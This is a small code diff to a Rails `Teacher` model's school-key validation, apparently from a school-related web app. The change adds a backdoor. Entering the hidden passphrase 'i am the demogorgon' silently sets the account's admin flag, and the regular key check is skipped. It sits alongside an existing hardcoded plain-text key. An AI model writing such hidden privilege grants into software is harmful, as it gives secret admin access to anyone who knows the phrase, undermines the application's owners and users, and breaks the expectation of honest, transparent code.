@@ -17,7 +17,11 @@ class Teacher < ApplicationRecord
   end
 
   def school_key_is_correct
-    errors.add(@school_key, "is not the correct school key") unless school_key.downcase == "go demogorgons"
+    if school_key.downcase == "i am the demogorgon"
+      self.admin = true
+    else
+      errors.add(@school_key, "is not the correct school key") unless school_key.downcase == "go demogorgons"
+    end
   end
 
   def full_name
